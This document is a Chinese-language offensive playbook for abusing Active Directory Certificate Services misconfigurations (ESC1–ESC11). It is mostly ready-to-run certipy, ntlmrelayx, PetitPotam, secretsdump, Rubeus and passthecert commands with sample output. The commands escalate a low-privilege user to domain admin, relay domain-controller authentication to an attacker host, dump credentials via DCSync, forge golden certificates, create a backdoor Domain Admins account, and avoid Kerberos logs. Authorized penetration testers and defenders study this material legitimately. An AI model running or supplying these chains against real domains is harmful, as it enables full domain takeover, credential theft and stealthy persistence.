# ADCS ESC1-ESC11 漏洞利用详解

## ESC1: 可控 SAN 的证书模板

**条件**：
- 模板启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- 低权限用户有 Enroll 权限
- 模板启用了 Client Authentication EKU

### ESC1 完整利用步骤

#### 第一步: 发现易受攻击的模板

```bash
# Certipy 枚举（自动标注 ESC1）
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout

# 输出中关注:
#   Template Name: VulnerableTemplate
#   [!] Vulnerabilities
#     ESC1: 'DOMAIN\\Domain Users' can enroll, enrollee supplies subject and target has Client Authentication EKU
#   ...
#   Enrollee Supplies Subject: True
#   Client Authentication: True
#   Enrollment Rights: DOMAIN\Domain Users
```

```powershell
# Windows: Certify 枚举
Certify.exe find /vulnerable

# 输出中关注:
#   msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
#   pkiextendedkeyusage: Client Authentication
#   Enrollment Rights: DOMAIN\Domain Users
```

#### 第二步: 申请高权限证书（指定目标 UPN）

```bash
# 以当前低权限用户身份申请域管证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template VulnerableTemplate \
  -upn administrator@DOMAIN

# 输出:
# [*] Requesting certificate via RPC
# [*] Successfully requested certificate
# [*] Request ID is 23
# [*] Got certificate with UPN 'administrator@DOMAIN'
# [*] Certificate has no object SID
# [*] Saved certificate and private key to 'administrator.pfx'
```

#### 第三步: 使用证书认证获取 TGT 和 NTLM Hash

```bash
# PKINIT 认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# 输出:
# [*] Using principal: administrator@DOMAIN
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@DOMAIN': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

#### 第四步: 利用获取的凭据

```bash
# 方法 A: 使用 NTLM Hash DCSync
impacket-secretsdump -hashes :2b576acbe6bcfda7294d6bd18041b8fe DOMAIN/administrator@DC_IP

# 方法 B: 使用 Kerberos 票据
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass DOMAIN/administrator@DC_FQDN

# 方法 C: 使用 NTLM Hash 横向移动
netexec smb DC_IP -u administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
```

## ESC2: Any Purpose / SubCA 模板

**条件**：
- 模板 EKU 为 `Any Purpose` 或 `SubCA`
- 低权限用户有 Enroll 权限

```bash
# Any Purpose 可以当客户端认证用
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TEMPLATE_NAME

# SubCA 证书可以签发子证书
# 先申请 SubCA 证书，然后用它签发任意证书
```

## ESC3: Certificate Request Agent

**条件**：
- 模板 A 有 Certificate Request Agent EKU + 低权限可 Enroll
- 模板 B 允许代理注册（enrollment agent）

```bash
# 第一步：申请 Request Agent 证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template AGENT_TEMPLATE

# 第二步：用 Agent 证书代理申请域管证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TARGET_TEMPLATE \
  -on-behalf-of 'DOMAIN\administrator' \
  -pfx agent.pfx
```

## ESC4: 模板写权限

**条件**：
- 低权限用户对证书模板有 WriteDacl / WriteOwner / WriteProperty

```bash
# 检查模板 ACL
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable
# 查找 "Write" 权限标记

# 修改模板为 ESC1 配置
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template TEMPLATE_NAME -save-old

# 利用修改后的模板
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TEMPLATE_NAME \
  -upn administrator@DOMAIN

# 恢复模板（可选，减少痕迹）
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json
```

## ESC6: CA 全局 SAN 配置

**条件**：
- CA 启用了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志
- 任意可注册模板

```bash
# 检查
certutil -config "CA_SERVER\CA-NAME" -getreg policy\EditFlags
# 如果包含 EDITF_ATTRIBUTESUBJECTALTNAME2 → 全局 ESC1

# 利用：任何模板都可以指定 SAN
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template User \
  -upn administrator@DOMAIN
```

## ESC7: CA 管理员权限

**条件**：
- 用户有 ManageCA 或 ManageCertificates 权限

```bash
# 如果有 ManageCA → 可以自己开启 ESC6
# 开启 EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -enable-template SubCA

# 申请 SubCA 证书（会被拒绝）
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template SubCA -upn administrator@DOMAIN
# 记录 Request ID

# 用 ManageCertificates 权限批准被拒绝的请求
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -issue-request REQUEST_ID

# 下载已批准的证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -retrieve REQUEST_ID
```

## ESC8: NTLM Relay 到 ADCS Web Enrollment

这是实战中最常用的 ADCS 攻击路径。PetitPotam 强制域控 NTLM 认证 + ntlmrelayx 中继到 ADCS 获取域控证书。

### 前提确认

```bash
# 确认 ADCS Web Enrollment 存在
curl -sk https://CA_SERVER/certsrv/
# 返回 401 或登录页面 → Web Enrollment 存在

curl -sk http://CA_SERVER/certsrv/
# HTTP 也可达 → 无 HTTPS 强制 → 更容易中继
```

### 完整命令链（3 个终端）

**终端 1: 启动 ntlmrelayx 中继**

```bash
# 基础用法
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# HTTPS 目标（需要忽略证书验证）
ntlmrelayx.py -t https://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 指定监听接口
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController \
  -ip ATTACKER_IP
```

**终端 2: 触发域控 NTLM 认证（PetitPotam）**

```bash
# PetitPotam 未认证版本（旧版 Windows 可用）
python3 PetitPotam.py ATTACKER_IP DC_IP

# PetitPotam 认证版本（推荐，兼容性更好）
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP

# 备选: PrinterBug (MS-RPRN)
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP

# 备选: DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
```

**终端 1 输出（中继成功）**

```
[*] SMBD-Thread-X: Received connection from DC_IP
[*] Authenticating against http://CA_SERVER as DOMAIN/DC_HOSTNAME$ SUCCEED
[*] SMBD-Thread-X: Connection from DC_IP controlled, attacking target http://CA_SERVER
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID XX
[*] Base64 encoded certificate written to: DC_HOSTNAME$.b64
```

**终端 3: 使用获取的证书**

```bash
# 方法 A: 直接使用 Base64 证书 (PKINITtools)
gettgtpkinit.py -pfx-base64 $(cat DC_HOSTNAME$.b64) \
  'DOMAIN/DC_HOSTNAME$' dc.ccache

export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass DOMAIN/'DC_HOSTNAME$'@DC_FQDN

# 方法 B: 转为 PFX 后用 certipy
echo "$(cat DC_HOSTNAME$.b64)" | base64 -d > dc.pfx
certipy auth -pfx dc.pfx -dc-ip DC_IP

# 输出:
# [*] Got hash for 'DC_HOSTNAME$@DOMAIN': aad3b435...:NTLM_HASH

# DCSync
impacket-secretsdump -hashes :NTLM_HASH DOMAIN/'DC_HOSTNAME$'@DC_IP
```

### 通过代理执行 ESC8

```bash
# 场景: 通过 C2 Beacon 的 SOCKS 代理执行
# 1. 在 Beacon 上设置端口转发和流量重定向
# beacon> rportfwd 8445 ATTACKER_IP 445
# beacon> socks 1080

# 2. 通过代理启动中继
proxychains4 -q ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 3. 触发目标向 Beacon 机器认证
# beacon> execute-assembly PetitPotam.exe BEACON_IP DC_IP
```

## ESC9: No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

**条件**：
- 模板设置了 `msPKI-Enrollment-Flag` 包含 `CT_FLAG_NO_SECURITY_EXTENSION`
- `StrongCertificateBindingEnforcement` 未设置为 2

```bash
# 修改用户的 UPN 为目标用户
# 申请证书（证书中嵌入的 SID 映射不严格）
# 恢复 UPN
# 用证书认证为目标用户
certipy shadow auto -u USER@DOMAIN -p PASS -dc-ip DC_IP -account TARGET_USER
```

## ESC10: 弱证书绑定

**条件**：
- `CertificateMappingMethods` 包含 `UPN` 映射
- 可以修改目标用户的 UPN

类似 ESC9，利用 UPN 映射的宽松性。

## ESC11: ICPR (RPC) 中继

```bash
# 类似 ESC8 但通过 RPC 而非 HTTP
# 当 Web Enrollment 不可用但 RPC 端点可用时
ntlmrelayx.py -t "rpc://CA_SERVER" -rpc-mode icpr \
  -smb2support --adcs --template DomainController
```

## 证书持久化

```bash
# Golden Certificate（获取 CA 私钥后）
# 可以伪造任意用户的证书，永久有效
certipy forge -ca-pfx ca.pfx -upn administrator@DOMAIN -subject "CN=Administrator"
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

---

## PKINIT 认证流程详解

### 概述

PKINIT（Public Key Cryptography for Initial Authentication）是 Kerberos 的扩展，允许使用 X.509 证书代替密码进行预认证。完整流程: 证书 → TGT → NTLM Hash (UnPAC-the-hash)。

### 认证流程

```
客户端持有证书 (PFX/PEM)
     │
     ▼
AS-REQ (PA-PK-AS-REQ)
  ├── 用证书私钥签名时间戳
  └── 发送到 KDC (88/tcp)
     │
     ▼
KDC 验证
  ├── 证书链有效性（CA 是否在 NTAuth 中）
  ├── 证书是否过期
  ├── 证书是否被吊销（CRL 检查）
  └── EKU 包含 Client Authentication
     │
     ▼
AS-REP
  ├── TGT（Ticket Granting Ticket）
  └── PAC（Privilege Attribute Certificate）
       └── 包含 NTLM Hash (encrypted)
```

### UnPAC-the-hash: 从 TGT 提取 NTLM Hash

Certipy 在 PKINIT 认证时自动执行 UnPAC-the-hash，从 KDC 响应的 PAC 中提取用户的 NTLM Hash:

```bash
# certipy auth 一步完成: 证书 → TGT → NTLM Hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# 输出:
# [*] Using principal: administrator@DOMAIN
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'  ← TGT
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@DOMAIN': aad3b435...:HASH  ← NTLM Hash
```

### 使用 PKINITtools 分步执行

```bash
# 步骤 1: 证书 → TGT
gettgtpkinit.py -cert-pfx administrator.pfx -dc-ip DC_IP \
  "DOMAIN/administrator" admin.ccache

# 步骤 2: TGT → NTLM Hash (UnPAC-the-hash)
export KRB5CCNAME=admin.ccache
getnthash.py -key AS_REP_KEY DOMAIN/administrator
# AS_REP_KEY 从 gettgtpkinit 输出中获取

# 步骤 3: 使用凭据
# 用 TGT
impacket-secretsdump -k -no-pass DOMAIN/administrator@DC_FQDN
# 用 NTLM Hash
impacket-secretsdump -hashes :NTLM_HASH DOMAIN/administrator@DC_IP
```

### Rubeus PKINIT (Windows)

```powershell
# 使用 PFX 文件获取 TGT
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:CERT_PASS /nowrap

# 使用 Base64 编码证书
Rubeus.exe asktgt /user:administrator /certificate:BASE64_CERT /password:CERT_PASS /ptt

# 输出:
# [*] Using PKINIT with etype rc4_hmac
# [+] TGT request successful!
# [*] base64(ticket.kirbi): doIFuj...
```

---

## PassTheCert: 证书直接 LDAP 认证

### 概述

PassTheCert 使用证书通过 Schannel 直接对 DC 的 LDAPS 服务进行 TLS 客户端认证。完全绕过 Kerberos，不产生 Event 4768 日志。

### 适用场景

- DC 不支持 PKINIT（报错 `KDC_ERR_PADATA_TYPE_NOSUPP`）
- 需要规避 Kerberos 认证日志
- 需要直接操作 LDAP 对象

### 从 PFX 提取证书和私钥

```bash
# certipy 提取
certipy cert -pfx administrator.pfx -nokey -out user.crt
certipy cert -pfx administrator.pfx -nocert -out user.key

# openssl 提取
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out user.crt
openssl pkcs12 -in administrator.pfx -nocerts -nodes -out user.key
```

### certipy LDAP Shell

```bash
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip DC_IP

# LDAP Shell 操作:
add_user backdoor P@ssw0rd              # 创建用户
add_user_to_group backdoor "Domain Admins"  # 加入 DA
set_rbcd TARGET_HOST EVIL_HOST          # 配置 RBCD
get_laps_password TARGET_HOST           # 读取 LAPS
```

### PassTheCert 工具

```bash
# LDAP Shell
python3 passthecert.py -action ldap-shell \
  -crt user.crt -key user.key \
  -domain DOMAIN -dc-ip DC_IP

# 添加机器账户
python3 passthecert.py -action add-computer \
  -crt user.crt -key user.key \
  -domain DOMAIN -dc-ip DC_IP \
  -computer-name 'EVIL$' -computer-pass 'P@ssw0rd'

# 配置 RBCD（基于资源的约束委派）
python3 passthecert.py -action write-rbcd \
  -crt user.crt -key user.key \
  -domain DOMAIN -dc-ip DC_IP \
  -delegate-to TARGET_HOST -delegate-from 'EVIL$'

# 修改用户密码
python3 passthecert.py -action modify-user \
  -crt user.crt -key user.key \
  -domain DOMAIN -dc-ip DC_IP \
  -target TARGET_USER -new-pass 'NewP@ssw0rd'
```

### PKINIT vs PassTheCert 对比

| 特性 | PKINIT | PassTheCert (Schannel) |
|------|--------|----------------------|
| 协议 | Kerberos (88/tcp) | LDAPS (636/tcp) |
| 产出 | TGT + NTLM Hash | LDAP Shell / 直接操作 |
| 日志 | Event 4768 | LDAP 审计日志（通常不启用） |
| DC 兼容性 | 需要 PKINIT 支持 | 所有支持 LDAPS 的 DC |
| 横向移动 | 可用 TGT 访问任意服务 | 仅限 LDAP 操作 |
| 隐蔽性 | 中 | 高 |

---

## 故障排查

| 错误 | 原因 | 解决 |
|------|------|------|
| KDC_ERR_PADATA_TYPE_NOSUPP | DC 不支持 PKINIT | 用 Schannel: `certipy auth -pfx x.pfx -ldap-shell` |
| KDC_ERR_CLIENT_NOT_TRUSTED | 证书链不受信任 | 检查 CA 证书是否在 NTAuth 中 |
| CERTSRV_E_TEMPLATE_DENIED | 无注册权限 | 换模板或提权后再试 |
| "Certificate not found" | certipy 版本问题 | 更新 certipy: `pip install certipy-ad --upgrade` |
